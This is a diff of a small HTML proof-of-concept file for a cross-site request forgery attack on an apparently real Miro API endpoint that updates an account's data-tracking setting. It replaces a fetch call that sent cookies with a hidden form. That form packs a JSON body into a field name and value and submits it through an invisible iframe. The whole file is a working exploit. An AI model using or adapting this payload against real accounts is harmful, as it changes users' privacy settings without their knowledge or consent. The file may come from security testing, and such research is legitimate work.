@@ -1,27 +1,12 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>CSRF PoC</h2>
-    <form id="csrfForm" method="POST" action="https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812" enctype="text/plain">
-      <button type="button" onclick="sendCSRF()">Click to Submit CSRF</button>
+    <h2>CSRF PoC - Pure HTML (Fallback Test)</h2>
+    <form action="https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812" method="POST" target="hiddenFrame">
+      <input type="hidden" name='{"dataTrackingEnabled"' value='true}'>
+      <input type="submit" value="Submit CSRF">
     </form>
 
-    <script>
-      function sendCSRF() {
-        const data = JSON.stringify({ dataTrackingEnabled: true });
-
-        fetch("https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812", {
-          method: "POST",
-          mode: "cors",
-          credentials: "include", // Important to send cookies
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: data
-        })
-        .then(res => alert("CSRF Request sent!"))
-        .catch(err => alert("Failed: " + err));
-      }
-    </script>
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
   </body>
 </html>
